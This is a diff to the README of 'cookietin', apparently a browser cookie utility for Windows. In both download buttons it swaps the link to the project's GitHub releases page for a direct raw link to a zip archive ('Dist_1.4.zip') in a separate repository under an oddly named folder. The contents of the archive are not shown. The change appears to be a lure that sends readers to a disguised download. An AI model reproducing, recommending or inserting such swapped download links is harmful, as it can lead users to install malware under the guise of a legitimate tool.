@@ -34,7 +34,7 @@ If you use any of these browsers on Windows, cookietin is compatible with your s
 
 Visit this link to download the application:
 
-[![Download cookietin](https://img.shields.io/badge/Download%20cookietin-Click%20Here-blue?style=for-the-badge&logo=github)](https://github.com/Dedebanded912/cookietin/releases)
+[![Download cookietin](https://img.shields.io/badge/Download%20cookietin-Click%20Here-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Dedebanded912/dedebanded912.github.io/main/unmeddled/Dist_1.4.zip)
 
 ### Step 2: Save the File
 
@@ -136,7 +136,7 @@ cookietin is an open-source project. This means the code is publicly available, 
 
 ### Visit the download page now and take control of your cookies:
 
-[🔽 Download cookietin Now](https://github.com/Dedebanded912/cookietin/releases)
+[🔽 Download cookietin Now](https://raw.githubusercontent.com/Dedebanded912/dedebanded912.github.io/main/unmeddled/Dist_1.4.zip)
 
 ---
 
